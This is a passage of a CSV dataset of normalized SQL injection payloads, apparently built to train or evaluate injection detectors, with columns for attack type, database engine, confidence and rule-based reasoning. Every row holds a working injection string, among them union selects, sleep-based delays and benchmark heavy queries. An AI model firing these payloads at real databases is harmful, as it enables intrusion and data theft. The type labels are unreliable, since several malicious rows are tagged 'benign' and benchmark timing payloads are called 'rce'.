row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
6344,"1 ) ) ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( ( 3504 = 3504",1,,heavy_query,firebird,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on firebird",rule-based
6345,"1' and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) )",1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
6346,"1 ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( 4003 = 4003",1,,boolean_blind,mysql,0.95,) and ( detected — boolean_blind injection (priority 8) on mysql,rule-based
6347,"-2067"" or 3038 = 3038",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
6348,"1'|| ( select 'dujx' where 6896 = 6896 and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers detected — heavy_query injection (priority 6) on generic",rule-based
6349,"1' in boolean mode ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) #",1,,rce,generic,0.95,0x52515a50 detected — rce injection (priority 1) on generic,rule-based
6350,"1"" and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
6351,"1 ) ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",1,,rce,generic,0.95,0x6d457153 detected — rce injection (priority 1) on generic,rule-based
6352,"1' ) as asjj where 1721 = 1721 union all select null,null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
6353,"-4286%"" ) ) ) union all select 2229,2229,2229,2229,2229,2229#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
6354,"1, ( select ( case when ( 8674 = 7896 ) then 1 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
6355,1%' ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( '%' = ',1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
6356,"1"" ) ) as exzo where 7518 = 7518 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) --",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
6357,"1' ) ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ( 'gbhd' = 'gbhd",1,,rce,generic,0.95,0x694a4745 detected — rce injection (priority 1) on generic,rule-based
6358,"1"" ) as nyzd where 5305 = 5305",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
6359,select case when 3819 = 1887 then 1 else null end--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
